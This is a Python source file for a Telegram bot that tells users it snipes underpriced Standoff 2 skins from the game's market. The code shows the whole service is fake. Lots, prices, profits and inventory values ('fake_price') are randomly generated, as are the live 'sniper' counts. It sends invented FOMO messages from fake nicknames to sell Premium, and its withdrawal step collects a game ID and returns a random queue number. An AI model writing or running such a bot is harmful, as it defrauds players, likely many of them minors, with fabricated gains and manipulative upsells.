"""
Standoff Chacker v3.8.1
Telegram bot for Standoff 2 skin tracking and market sniping.
"""

import asyncio
import json
import os
import random
import time
from datetime import datetime

import aiosqlite
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    PreCheckoutQuery,
    URLInputFile,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

from config import ADMIN_ID, BOT_TOKEN, DB_PATH


bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()

FREE_TIME_DEFAULT = 3600
PREMIUM_PRICE = 100
HUNT_TICK_SECONDS = 30

PRICE_JSON_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "price.json"
)

WITHRAW_QUEUE_BASE = 24910


class WithdrawStates(StatesGroup):
    """FSM states for the withdrawal scenario."""
    waiting_id = State()


active_hunts: dict[int, dict] = {}


FAKE_NICKNAMES = [
    "ProS**per",
    "Nar***T",
    "Cl**ud",
    "Sn**peR",
    "Gho**st",
    "Ma***x",
    "Vi**per",
    "Hun***er",
    "De**vil",
    "Qu***in",
]


KNIFE_KEYWORDS = [
    "knife",
    "karambit",
    "butterfly",
    "m9",
    "kunai",
    "jcommando",
    "jkommando",
    "fang",
    "scorpion",
    "bayonet",
    "tanto",
    "stiletto",
    "kukri",
    "daggers",
    "flip",
    "dual dagger",
    "sting",
]

GLOVE_KEYWORDS = [
    "glove",
    "перчатки",
    "перчатки",
]

KNIFE_BASE_PRICE = (12000.0, 35000.0)
GLOVES_BASE_PRICE = (8000.0, 22000.0)
ARCANE_NON_KNIFE_BASE = (1500.0, 4500.0)
LEGENDARY_BASE_PRICE = (400.0, 1200.0)
BASIC_BASE_PRICE = (5.0, 500.0)


RARITY_PRICE_RANGES = {
    "Common": (5, 20),
    "Uncommon": (25, 80),
    "Rare": (100, 300),
    "Epic": (400, 1200),
    "Legendary": (400, 1200),
    "Arcane": (1500, 4500),
    "Arcane-Glove": (8000, 22000),
}


ARCANE_KNIVES = [
    "Arcane Karambit",
    "Arcane Stiletto",
    "Arcane Butterfly",
    "Arcane M9 Bayonet",
    "Arcane Talon",
    "Arcane Falchion",
    "Arcane Bowie",
    "Arcane Flip",
    "Arcane Bayonet",
    "Arcane Huntsman",
]


ARCANE_GLOVES = [
    "Arcane Gloves Crimson",
    "Arcane Gloves Vise",
    "Arcane Gloves Gold Rush",
    "Arcane Gloves Motosport",
    "Arcane Gloves Amphibious",
    "Arcane Gloves Specialist",
    "Arcane Gloves Night",
]


ARCANE_PRICE_RANGE = (15000, 45000)


def format_time_left(seconds: int) -> str:
    """Format seconds into minutes and seconds."""
    if seconds <= 0:
        return "0 мин 0 сек"

    return f"{seconds // 60} мин {seconds % 60} сек"


def generate_market_price(rare: str) -> float:
    """Generate a dynamic market gold price for a given rarity."""
    low, high = RARITY_PRICE_RANGES.get(
        rare,
        RARITY_PRICE_RANGES["Common"]
    )

    return round(random.uniform(low, high), 2)


def _is_knife_skin(name: str) -> bool:
    """Return True if the skin name refers to a knife melee weapon."""
    lowered = (name or "").lower()

    return any(
        kw in lowered
        for kw in KNIFE_KEYWORDS
    )


def _is_gloves_skin(skin: dict) -> bool:
    """Return True if the skin is a pair of gloves."""
    haystack = " ".join([
        skin.get("type") or "",
        skin.get("Collection") or skin.get("collection") or "",
        skin.get("name") or "",
    ]).lower()

    return any(
        kw in haystack
        for kw in GLOVE_KEYWORDS
    )


def _base_market_price(skin: dict) -> float:
    """Return the fixed base price for a skin category."""

    name = skin.get("name") or ""
    rare = (skin.get("rare") or "").strip()

    if _is_gloves_skin(skin):
        return round(
            random.uniform(*GLOVES_BASE_PRICE),
            2
        )

    if _is_knife_skin(name):
        return round(
            random.uniform(*KNIFE_BASE_PRICE),
            2
        )

    if rare.lower() == "arcane":
        return round(
            random.uniform(*ARCANE_NON_KNIFE_BASE),
            2
        )

    if rare.lower() == "legendary":
        return round(
            random.uniform(*LEGENDARY_BASE_PRICE),
            2
        )

    return round(
        random.uniform(*BASIC_BASE_PRICE),
        2
    )


def _market_price_for_skin(skin: dict) -> float:
    """Fallback category-based market price."""
    base = _base_market_price(skin)
    coeff = random.uniform(0.93, 1.07)

    return round(
        base * coeff,
        2
    )


def _is_admin(user_id: int) -> bool:
    """Return True if the user is the bot owner."""
    return user_id == ADMIN_ID


def _load_price_feed() -> dict | None:
    """
    Read the local price feed JSON.

    Expected format:

    {
        "skins": [
            {
                "id": 1,
                "name": "...",
                "type": "...",
                "rare": "...",
                "market_price": 123.45,
                "id_Img": "..."
            }
        ]
    }
    """

    try:
        if not os.path.exists(PRICE_JSON_PATH):
            return None

        with open(
            PRICE_JSON_PATH,
            "r",
            encoding="utf-8"
        ) as f:
            data = json.load(f)

        return data if isinstance(data, dict) else None

    except Exception:
        return None


async def init_db() -> None:
    """Create tables if they are missing."""

    async with aiosqlite.connect(DB_PATH) as db:

        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                status TEXT NOT NULL DEFAULT 'FREE',
                premium_until INTEGER NOT NULL DEFAULT 0,
                free_time_left INTEGER NOT NULL DEFAULT 3600,
                last_daily_reset INTEGER NOT NULL DEFAULT 0,
                today_earned_profit REAL NOT NULL DEFAULT 0,
                target_daily_limit REAL NOT NULL DEFAULT 0
            )
        """)

        await db.execute("""
            CREATE TABLE IF NOT EXISTS inventory (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                skin_name TEXT NOT NULL,
                fake_price REAL NOT NULL,
                capture_time INTEGER NOT NULL
            )
        """)

        await db.execute("""
            CREATE TABLE IF NOT EXISTS skins (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                rare TEXT NOT NULL,
                collection TEXT NOT NULL,
                id_img TEXT NOT NULL,
                description TEXT NOT NULL
            )
        """)

        await db.commit()

        cols_res = await db.execute(
            "PRAGMA table_info(users)"
        )

        cols_rows = await cols_res.fetchall()

        existing_cols = {
            row[1]
            for row in cols_rows
        }

        if "today_earned_profit" not in existing_cols:
            await db.execute(
                "ALTER TABLE users "
                "ADD COLUMN today_earned_profit "
                "REAL NOT NULL DEFAULT 0"
            )

        if "target_daily_limit" not in existing_cols:
            await db.execute(
                "ALTER TABLE users "
                "ADD COLUMN target_daily_limit "
                "REAL NOT NULL DEFAULT 0"
            )

        await db.commit()


async def get_user(user_id: int) -> dict | None:
    """Get or create a user record."""

    async with aiosqlite.connect(DB_PATH) as db:

        db.row_factory = aiosqlite.Row

        async with db.execute(
            "SELECT * FROM users WHERE user_id = ?",
            (user_id,)
        ) as cursor:

            row = await cursor.fetchone()

            if row:
                return dict(row)

        await db.execute(
            "INSERT INTO users (user_id) VALUES (?)",
            (user_id,)
        )

        await db.commit()

        async with db.execute(
            "SELECT * FROM users WHERE user_id = ?",
            (user_id,)
        ) as cursor:

            row = await cursor.fetchone()

            return dict(row)


async def update_user(user_id: int, **kwargs) -> None:
    """Update arbitrary user fields."""

    if not kwargs:
        return

    set_clause = ", ".join(
        f"{key} = ?"
        for key in kwargs
    )

    values = list(kwargs.values()) + [user_id]

    async with aiosqlite.connect(DB_PATH) as db:

        await db.execute(
            f"UPDATE users SET {set_clause} "
            f"WHERE user_id = ?",
            values
        )

        await db.commit()


def _generate_daily_limit(status: str) -> float:
    """Generate the daily target profit limit for the day."""

    if status == "FREE":
        return round(
            random.uniform(10.0, 40.0),
            2
        )

    roll = random.random()

    if roll < 0.70:
        low, high = 400, 1000

    elif roll < 0.95:
        low, high = 1001, 2500

    else:
        low, high = 2501, 5000

    return round(
        random.uniform(low, high),
        2
    )


async def check_and_reset_daily_time(
    user_data: dict
) -> dict:

    current_time = int(time.time())

    last_reset = user_data.get(
        "last_daily_reset",
        0
    )

    current_day_start = datetime.now().replace(
        hour=0,
        minute=0,
        second=0,
        microsecond=0
    )

    current_day_timestamp = int(
        current_day_start.timestamp()
    )

    if last_reset < current_day_timestamp:

        status = await get_user_status(user_data)

        new_limit = _generate_daily_limit(status)

        await update_user(
            user_data["user_id"],
            free_time_left=FREE_TIME_DEFAULT,
            last_daily_reset=current_time,
            today_earned_profit=0,
            target_daily_limit=new_limit,
        )

        user_data["free_time_left"] = FREE_TIME_DEFAULT
        user_data["last_daily_reset"] = current_time
        user_data["today_earned_profit"] = 0
        user_data["target_daily_limit"] = new_limit

    if user_data.get(
        "target_daily_limit",
        0
    ) <= 0:

        status = await get_user_status(user_data)

        new_limit = _generate_daily_limit(status)

        await update_user(
            user_data["user_id"],
            target_daily_limit=new_limit
        )

        user_data["target_daily_limit"] = new_limit

    return user_data


async def get_user_status(
    user_data: dict
) -> str:

    if user_data.get(
        "premium_until",
        0
    ) > int(time.time()):

        return "PREMIUM"

    return "FREE"


async def get_inventory_summary(
    user_id: int
) -> tuple[float, int]:

    async with aiosqlite.connect(DB_PATH) as db:

        async with db.execute(
            "SELECT COALESCE(SUM(fake_price),0), "
            "COUNT(*) FROM inventory "
            "WHERE user_id=?",
            (user_id,)
        ) as c:

            row = await c.fetchone()

            total = float(
                row[0] or 0
            )

            count = int(
                row[1] or 0
            )

    return total, count


async def pick_random_skin() -> dict | None:

    price_feed = _load_price_feed()

    if price_feed and isinstance(
        price_feed,
        dict
    ):

        items = (
            price_feed.get("skins")
            or price_feed.get("items")
        )

        if items:

            idx = random.randrange(
                len(items)
            )

            pick = items[idx]

            skin_id = pick.get(
                "id"
            ) or (idx + 1)

            return {
                "id": skin_id,

                "name": pick.get(
                    "name",
                    "Unknown Skin"
                ),

                "rare": pick.get(
                    "rare",
                    "Common"
                ),

                "id_img": (
                    pick.get("id_Img")
                    or pick.get("id_img", "")
                ),

                "type": pick.get(
                    "type",
                    ""
                ),

                "collection": (
                    pick.get("Collection")
                    or pick.get("collection", "")
                ),

                "category": pick.get(
                    "Category",
                    ""
                ),

                "description": pick.get(
                    "description",
                    ""
                ),

                "market_price": pick.get(
                    "market_price"
                ),
            }

    async with aiosqlite.connect(DB_PATH) as db:

        db.row_factory = aiosqlite.Row

        async with db.execute(
            "SELECT * FROM skins "
            "WHERE rare IN "
            "('Common','Uncommon','Rare','Epic') "
            "ORDER BY RANDOM() LIMIT 1"
        ) as c:

            row = await c.fetchone()

            return dict(row) if row else None


def get_main_keyboard(
    status: str,
    time_left: int
) -> InlineKeyboardMarkup:

    builder = InlineKeyboardBuilder()

    if status == "PREMIUM" or time_left > 0:

        builder.row(
            InlineKeyboardButton(
                text="🎯 ЗАПУСТИТЬ ОХОТУ",
                callback_data="start_hunt"
            )
        )

    else:

        builder.row(
            InlineKeyboardButton(
                text="❌ ОХОТА НЕДОСТУПНА",
                callback_data="hunt_blocked"
            )
        )

    builder.row(
        InlineKeyboardButton(
            text="🎒 МОЙ ИНВЕНТАРЬ",
            callback_data="view_inv"
        )
    )

    builder.row(
        InlineKeyboardButton(
            text=(
                f"👑 АКТИВИРОВАТЬ PREMIUM "
                f"({PREMIUM_PRICE} 🌟)"
            ),
            callback_data="activate_premium"
        )
    )

    return builder.as_markup()


async def build_main_panel(
    user_id: int
) -> tuple[str, InlineKeyboardMarkup]:

    user_data = await get_user(user_id)

    user_data = await check_and_reset_daily_time(
        user_data
    )

    status = await get_user_status(
        user_data
    )

    active_accounts = random.randint(
        2248,
        2657
    )

    balance, items_count = await get_inventory_summary(
        user_id
    )

    text = (
        "🎯 <b>STANDOFF CHACKER v3.8.1</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 <b>Активных снайп-аккаунтов:</b> "
        f"{active_accounts}\n\n"
        "📊 <b>Оборот голды за день:</b> 600 000+\n"
        f"🔑 <b>Ваш статус:</b> {status}\n"
    )

    if status == "FREE":

        text += (
            "⏱ <b>Доступ:</b> 60 минут в день\n"
        )

    else:

        premium_until = user_data.get(
            "premium_until",
            0
        )

        remaining_seconds = max(
            0,
            premium_until - int(time.time())
        )

        remaining_days = max(
            1,
            (remaining_seconds + 86399) // 86400
        )

        text += (
            f"⏱ <b>Доступ:</b> "
            f"{remaining_days} дней\n"
        )

    text += (
        f"\n🎒 <b>Ваш баланс:</b> "
        f"{balance:.2f}G / "
        f"{items_count} скинов"
    )

    keyboard = get_main_keyboard(
        status,
        user_data.get(
            "free_time_left",
            0
        )
    )

    return text, keyboard


async def _deduct_free_time(
    user_id: int,
    seconds: int
) -> int:

    user_data = await get_user(user_id)

    status = await get_user_status(
        user_data
    )

    if status == "PREMIUM":
        return user_data.get(
            "free_time_left",
            FREE_TIME_DEFAULT
        )

    remaining = user_data.get(
        "free_time_left",
        0
    )

    remaining -= seconds

    if remaining < 0:
        remaining = 0

    await update_user(
        user_id,
        free_time_left=remaining
    )

    return remaining


async def _free_time_worker(
    user_id: int,
    chat_id: int
) -> None:

    try:

        while active_hunts.get(
            user_id,
            {}
        ).get(
            "running",
            False
        ):

            await asyncio.sleep(
                HUNT_TICK_SECONDS
            )

            if not active_hunts.get(
                user_id,
                {}
            ).get(
                "running",
                False
            ):
                break

            remaining = await _deduct_free_time(
                user_id,
                HUNT_TICK_SECONDS
            )

            user_data = await get_user(
                user_id
            )

            status = await get_user_status(
                user_data
            )

            if (
                status == "FREE"
                and remaining <= 0
            ):

                active_hunts[user_id][
                    "running"
                ] = False

                try:

                    await bot.send_message(
                        chat_id,
                        "⛔ <b>Фри-время закончилось! обновление лимита 24 часа.</b>\n"
                        "Купите PREMIUM для неограниченной охоты.",
                        parse_mode="HTML",
                    )

                except Exception:
                    pass

                break

    except asyncio.CancelledError:
        pass

    except Exception:
        pass


async def _pick_arcane_knife() -> str:

    return random.choice(
        ARCANE_KNIVES
    )


async def _real_market_price(
    skin: dict
) -> float:

    price = skin.get(
        "market_price"
    )

    if price is not None:

        try:

            return float(price)

        except (
            TypeError,
            ValueError
        ):
            pass

    return _market_price_for_skin(
        skin
    )


def _approaching_free_limit(
    today_profit: float,
    target_limit: float
) -> bool:

    if target_limit <= 0:
        return False

    return (
        today_profit
        >= target_limit * 0.95
    )


def _premium_remaining_budget(
    today_profit: float,
    target_limit: float
) -> float:

    return max(
        0.0,
        target_limit - today_profit
    )


async def _fire_interception(
    user_id: int,
    chat_id: int
) -> None:

    user_data = await get_user(
        user_id
    )

    await check_and_reset_daily_time(
        user_data
    )

    status = await get_user_status(
        user_data
    )

    today_profit = (
        user_data.get(
            "today_earned_profit",
            0
        ) or 0
    )

    target_limit = (
        user_data.get(
            "target_daily_limit",
            0
        ) or 0
    )

    if (
        status == "FREE"
        and _approaching_free_limit(
            today_profit,
            target_limit
        )
    ):

        try:

            await bot.send_message(
                chat_id,
                "⏳ <b>Дневная квота прибыли "
                "исчерпана для бесплатного тарифа.</b>\n"
                f"Заработано: "
                f"{today_profit:.2f}G / "
                f"лимит {target_limit:.2f}G.\n"
                "Купите PREMIUM, чтобы "
                "продолжить охоту за большими лотами.",
                parse_mode="HTML",
            )

        except Exception:
            pass

        return

    skin = await pick_random_skin()

    if not skin:
        return

    rare = skin.get(
        "rare",
        "Common"
    )

    skin_name = skin.get(
        "name",
        "Unknown Skin"
    )

    id_img = skin.get(
        "id_img",
        ""
    )

    market_price = await _real_market_price(
        skin
    )

    commission = round(
        market_price * 0.20,
        2
    )

    gross_floor = round(
        market_price * 0.8,
        2
    )

    buy_price = round(
        max(
            0.01,
            random.uniform(
                gross_floor * 0.15,
                gross_floor * 0.85
            )
        ),
        2
    )

    if buy_price >= gross_floor:

        buy_price = round(
            gross_floor * 0.85,
            2
        )

    user_profit = round(
        gross_floor - buy_price,
        2
    )

    if user_profit <= 0:

        user_profit = round(
            max(
                0.01,
                gross_floor * 0.05
            ),
            2
        )

        buy_price = round(
            gross_floor - user_profit,
            2
        )

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🎒 ОТКРЫТЬ ИНВЕНТАРЬ",
                    callback_data="view_inv"
                )
            ]
        ]
    )

    caption = (
        f'🎯 Найден лот скина ("{skin_name}")\n\n'
        "🎯 <b>ПЕРЕХВАТ ЛОТА!</b>\n\n"
        f"Цена перехвата: "
        f"<b>{buy_price:.2f}G</b>\n\n"
        f"Рыночная стоимость: "
        f"<b>{market_price:.2f}G</b>\n\n"
        f"Скин: {skin_name} ({rare})\n\n"
        f"Прибыль с учетом комиссии платформы: "
        f"<b>+{user_profit:.2f}G</b>"
    )

    active_hunts[user_id][
        "current_lot"
    ] = {
        "skin_id": skin["id"],
        "skin": skin,
        "market_price": market_price,
        "commission": commission,
        "buy_price": buy_price,
        "user_profit": user_profit,
    }

    await _send_lot_message(
        chat_id,
        caption,
        id_img,
        kb
    )


async def _send_lot_message(
    chat_id: int,
    caption: str,
    id_img: str,
    kb: InlineKeyboardMarkup
) -> None:

    try:

        if id_img and (
            id_img.startswith("http://")
            or id_img.startswith("https://")
            or id_img.startswith("/")
            or "." in id_img
        ):

            try:

                photo = URLInputFile(
                    id_img
                )

                await bot.send_photo(
                    chat_id,
                    photo,
                    caption=caption,
                    reply_markup=kb,
                    parse_mode="HTML",
                )

                return

            except Exception:
                pass

    except Exception:
        pass

    body = caption

    if id_img:

        body += (
            f"\n🖼 Картинка: "
            f"<code>{id_img}</code>"
        )

    await bot.send_message(
        chat_id,
        body,
        reply_markup=kb,
        parse_mode="HTML"
    )


async def _fire_arcane_interception(
    user_id: int,
    chat_id: int
) -> None:

    user_data = await get_user(
        user_id
    )

    await check_and_reset_daily_time(
        user_data
    )

    today_profit = (
        user_data.get(
            "today_earned_profit",
            0
        ) or 0
    )

    target_limit = (
        user_data.get(
            "target_daily_limit",
            0
        ) or 0
    )

    if random.random() < 0.7:

        item_name = random.choice(
            ARCANE_KNIVES
        )

        rare = "Arcane"

    else:

        item_name = random.choice(
            ARCANE_GLOVES
        )

        rare = "Arcane-Glove"

    premium_skin = {
        "name": item_name,
        "rare": rare,
        "type": (
            "Ножи"
            if "glove" not in item_name.lower()
            else "Перчатки"
        )
    }

    base_price = _market_price_for_skin(
        premium_skin
    )

    remaining = _premium_remaining_budget(
        today_profit,
        target_limit
    )

    if target_limit > 0:

        ratio = max(
            0.02,
            min(
                1.0,
                remaining / target_limit
            )
        )

        market_price = round(
            base_price * ratio,
            2
        )

        market_price = round(
            max(50.0, market_price),
            2
        )

    else:

        market_price = base_price

    commission = round(
        market_price * 0.20,
        2
    )

    gross_floor = round(
        market_price * 0.8,
        2
    )

    buy_price = round(
        max(
            0.01,
            random.uniform(
                gross_floor * 0.2,
                gross_floor * 0.8
            )
        ),
        2
    )

    if buy_price >= gross_floor:

        buy_price = round(
            gross_floor * 0.8,
            2
        )

    user_profit = round(
        gross_floor - buy_price,
        2
    )

    if user_profit <= 0:

        user_profit = round(
            max(
                0.01,
                gross_floor * 0.05
            ),
            2
        )

        buy_price = round(
            gross_floor - user_profit,
            2
        )

    skin = {
        "id": -1,
        "name": item_name,
        "rare": rare,
        "id_img": "",
    }

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🎒 ОТКРЫТЬ ИНВЕНТАРЬ",
                    callback_data="view_inv"
                )
            ]
        ]
    )

    caption = (
        f'🎯 Найден лот скина ("{item_name}")\n\n'
        "👑 <b>ПРЕМИУМ-ЛОТ ОБНАРУЖЕН!</b>\n"
        f"Цена перехвата: "
        f"<b>{buy_price:.2f}G</b>\n"
        f"Рыночная стоимость: "
        f"<b>{market_price:.2f}G</b>\n"
        f"Скин: {item_name} ({rare})\n"
        f"Прибыль с учетом комиссии платформы: "
        f"<b>+{user_profit:.2f}G</b>\n"
        "🔒 Доступен только на Premium-серверах."
    )

    active_hunts[user_id][
        "current_lot"
    ] = {
        "skin_id": f"arcane:{item_name}",
        "skin": skin,
        "market_price": market_price,
        "commission": commission,
        "buy_price": buy_price,
        "user_profit": user_profit,
    }

    await _send_lot_message(
        chat_id,
        caption,
        "",
        kb
    )


async def _interception_worker(
    user_id: int,
    chat_id: int
) -> None:

    try:

        while active_hunts.get(
            user_id,
            {}
        ).get(
            "running",
            False
        ):

            user_data = await get_user(
                user_id
            )

            status = await get_user_status(
                user_data
            )

            if status == "PREMIUM":

                await asyncio.sleep(
                    random.uniform(
                        60,
                        120
                    )
                )

                if not active_hunts.get(
                    user_id,
                    {}
                ).get(
                    "running",
                    False
                ):
                    break

                await _fire_arcane_interception(
                    user_id,
                    chat_id
                )

            else:

                await asyncio.sleep(
                    random.uniform(
                        150,
                        240
                    )
                )

                if not active_hunts.get(
                    user_id,
                    {}
                ).get(
                    "running",
                    False
                ):
                    break

                await _fire_interception(
                    user_id,
                    chat_id
                )

    except asyncio.CancelledError:
        pass

    except Exception:
        pass


async def _run_hunt_animation(
    message: Message
) -> None:
    """Show animated hunt start sequence."""

    steps = [
        "⌛ Подключение к серверам рынка...",
        "📡 Прокси развернуты...",
        "🟢 Поиск запущен! Поток: СТАНДАРТНЫЙ (В среднем лотов 24/час)",
    ]

    try:

        sent = await message.answer(
            steps[0],
            parse_mode="HTML"
        )

        for step in steps[1:]:

            await asyncio.sleep(
                1.5
            )

            try:

                await sent.edit_text(
                    step,
                    parse_mode="HTML"
                )

            except Exception:

                sent = await message.answer(
                    step,
                    parse_mode="HTML"
                )

    except Exception:

        try:

            await message.answer(
                steps[-1],
                parse_mode="HTML"
            )

        except Exception:
            pass


@router.message(CommandStart())
async def cmd_start(
    message: Message
) -> None:

    user_id = message.from_user.id

    text, keyboard = await build_main_panel(
        user_id
    )

    await message.answer(
        text,
        reply_markup=keyboard,
        parse_mode="HTML"
    )


async def _fomo_notification(
    user_id: int,
    chat_id: int
) -> None:

    nickname = random.choice(
        FAKE_NICKNAMES
    )

    arcane = await _pick_arcane_knife()

    arcane_price = random.randint(
        *ARCANE_PRICE_RANGE
    )

    fomo_buy = round(
        random.uniform(
            0.5,
            arcane_price * 0.1
        ),
        2
    )

    text = (
        "🔔 <b>LIVE-УВЕДОМЛЕНИЕ "
        "РЫНКА (PREMIUM)</b>\n"
        f"👤 Пользователь {nickname} (PREMIUM)\n"
        f"🎯 Перехвачен лот: {arcane}\n"
        f"💸 Цена покупки: {fomo_buy}G "
        f"(Рыночная: {arcane_price}G)\n"
        "⚠️ Ваша скорость на бесплатном тарифе "
        "ограничена задержкой прокси 1.5 сек. "
        "Купите Premium, чтобы перехватывать "
        "Arcane-лоты."
    )

    try:

        await bot.send_message(
            chat_id,
            text,
            parse_mode="HTML"
        )

    except Exception:
        pass


@router.callback_query(
    F.data == "start_hunt"
)
async def start_hunt(
    callback: CallbackQuery
) -> None:

    user_id = callback.from_user.id

    chat_id = callback.message.chat.id

    user_data = await get_user(
        user_id
    )

    user_data = await check_and_reset_daily_time(
        user_data
    )

    status = await get_user_status(
        user_data
    )

    time_left = user_data.get(
        "free_time_left",
        0
    )

    if (
        status == "FREE"
        and time_left <= 0
    ):

        await callback.answer(
            "⛔ Лимит фри-времени "
            "на сегодня исчерпан! "
            "Купите PREMIUM на 24 часа.",
            show_alert=True,
        )

        return

    if active_hunts.get(
        user_id,
        {}
    ).get(
        "running",
        False
    ):

        await callback.answer(
            "🟢 Охота уже запущена! "
            "Ожидайте лотов на рынке.",
            show_alert=True,
        )

        return

    await callback.answer()

    await _run_hunt_animation(
        callback.message
    )

    active_hunts[user_id] = {
        "running": True,
        "chat_id": chat_id,
        "current_lot": None,
        "captured_this_lot": False,
    }

    asyncio.create_task(
        _free_time_worker(
            user_id,
            chat_id
        )
    )

    asyncio.create_task(
        _interception_worker(
            user_id,
            chat_id
        )
    )


@router.callback_query(
    F.data == "hunt_blocked"
)
async def hunt_blocked(
    callback: CallbackQuery
) -> None:

    await callback.answer(
        "⛔ Лимит фри-времени "
        "на сегодня исчерпан!\n"
        "Купите PREMIUM на 24 часа "
        "для неограниченной охоты.",
        show_alert=True,
    )


async def _save_to_inventory(
    user_id: int,
    skin: dict,
    market_price: float,
    user_profit: float
) -> None:

    async with aiosqlite.connect(
        DB_PATH
    ) as db:

        await db.execute(
            "INSERT INTO inventory "
            "(user_id, skin_name, fake_price, capture_time) "
            "VALUES (?, ?, ?, ?)",
            (
                user_id,
                skin.get(
                    "name",
                    "Unknown Skin"
                ),
                market_price,
                int(time.time())
            ),
        )

        await db.execute(
            "UPDATE users "
            "SET today_earned_profit = "
            "today_earned_profit + ? "
            "WHERE user_id = ?",
            (
                user_profit,
                user_id
            ),
        )

        await db.commit()


@router.callback_query(
    F.data.startswith("capture:")
)
async def capture_lot(
    callback: CallbackQuery
) -> None:

    user_id = callback.from_user.id

    chat_id = callback.message.chat.id

    lot_key = callback.data[
        len("capture:") :
    ]

    hunt = active_hunts.get(
        user_id
    )

    if not hunt or not hunt.get(
        "running",
        False
    ):

        await callback.answer(
            "⛔ Охота не активна. "
            "Запустите охоту заново.",
            show_alert=True,
        )

        return

    lot = hunt.get(
        "current_lot"
    )

    if not lot:

        await callback.answer(
            "⚠️ Лот уже исчез с рынка.",
            show_alert=True
        )

        return

    if (
        str(lot.get("skin_id"))
        != lot_key
        or hunt.get(
            "captured_this_lot",
            False
        )
    ):

        await callback.answer(
            "⛔ Лот уже перехвачен "
            "другим снайпером!",
            show_alert=True,
        )

        return

    skin = lot["skin"]

    market_price = float(
        lot.get(
            "market_price",
            0
        ) or 0
    )

    buy_price = float(
        lot.get(
            "buy_price",
            0
        ) or 0
    )

    commission = float(
        lot.get(
            "commission",
            round(
                market_price * 0.20,
                2
            )
        ) or 0
    )

    user_profit = float(
        lot.get(
            "user_profit",
            0
        ) or 0
    )

    if user_profit <= 0:

        gross_floor = (
            market_price * 0.8
        )

        user_profit = round(
            max(
                0.0,
                gross_floor - buy_price
            ),
            2
        )

    await _save_to_inventory(
        user_id,
        skin,
        market_price,
        user_profit
    )

    hunt["captured_this_lot"] = True

    await callback.answer(
        "✅ Лот перехвачен и сохранён "
        "в ваш инвентарь!",
        show_alert=True,
    )

    try:

        await callback.message.answer(
            "🎯 <b>ЛОТ УСПЕШНО ПЕРЕХВАЧЕН!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔫 Предмет: "
            f"{skin.get('name', 'Unknown')} "
            f"[{skin.get('rare', '')}]\n"
            f"📊 Рыночная стоимость: "
            f"{market_price:.2f} G\n"
            f"📉 Выкуплено ботом за: "
            f"{buy_price:.2f} G\n"
            f"💸 Комиссия рынка (20%): "
            f"-{commission:.2f} G\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 Чистая прибыль на ваш баланс: "
            f"+{user_profit:.2f} G",
            parse_mode="HTML",
        )

    except Exception:
        pass

    await _fomo_notification(
        user_id,
        chat_id
    )

    hunt["current_lot"] = None
    hunt["captured_this_lot"] = False


@router.callback_query(
    F.data == "view_inv"
)
async def view_inv(
    callback: CallbackQuery
) -> None:

    user_id = callback.from_user.id

    balance, items_count = await get_inventory_summary(
        user_id
    )

    async with aiosqlite.connect(
        DB_PATH
    ) as db:

        db.row_factory = aiosqlite.Row

        async with db.execute(
            "SELECT skin_name, fake_price "
            "FROM inventory "
            "WHERE user_id=? "
            "ORDER BY fake_price DESC",
            (user_id,)
        ) as cursor:

            items = await cursor.fetchall()

    lines = []

    for idx, item in enumerate(
        items,
        start=1
    ):

        name = (
            item["skin_name"]
            or "Unknown Skin"
        )

        price = float(
            item["fake_price"]
            or 0
        )

        lines.append(
            f"{idx}. {name} — "
            f"{price:.1f}G "
            f"[Готов к отправке]"
        )

    text = (
        "🎒 <b>ВАШ ИНВЕНТАРЬ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 <b>Скинов в хранилище:</b> "
        f"{items_count}\n"
        f"💰 <b>Суммарная стоимость:</b> "
        f"{balance:.2f}G\n\n"
    )

    if lines:

        text += (
            "<b>Лист предметов:</b>\n"
            + "\n".join(lines)
        )

    else:

        text += (
            "Инвентарь пуст. "
            "Запустите охоту, чтобы "
            "перехватывать лоты."
        )

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="📦 ВЫВЕСТИ ВСЁ В ИГРУ",
                    callback_data="start_withdraw"
                )
            ]
        ]
    )

    await callback.message.answer(
        text,
        reply_markup=kb,
        parse_mode="HTML"
    )

    await callback.answer()


@router.callback_query(
    F.data == "start_withdraw"
)
async def start_withdraw(
    callback: CallbackQuery,
    state: FSMContext
) -> None:

    await callback.answer()

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="◀️ Отмена",
                    callback_data="cancel_withdraw"
                )
            ]
        ]
    )

    await callback.message.answer(
        "〽️ <b>ИНИЦИАЦИЯ ВЫВОДА СРЕДСТВ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Введите ваш <b>текстовый Игровой ID</b> "
        "из профиля Standoff 2 "
        "(12-значный идентификатор, "
        "показан в настройках аккаунта).\n\n"
        "⚠️ ID необходим для маршрутизации "
        "трейда через шлюз валидации Axlebolt.",
        reply_markup=kb,
        parse_mode="HTML",
    )

    await state.set_state(
        WithdrawStates.waiting_id
    )


@router.callback_query(
    F.data == "cancel_withdraw"
)
async def cancel_withdraw(
    callback: CallbackQuery,
    state: FSMContext
) -> None:

    await state.clear()

    await callback.answer(
        "Вывод отменён.",
        show_alert=True
    )


@router.message(
    WithdrawStates.waiting_id
)
async def withdraw_id_received(
    message: Message,
    state: FSMContext
) -> None:

    game_id = (
        message.text or ""
    ).strip()

    queue_number = (
        WITHRAW_QUEUE_BASE
        + random.randint(1, 40)
    )

    await state.clear()

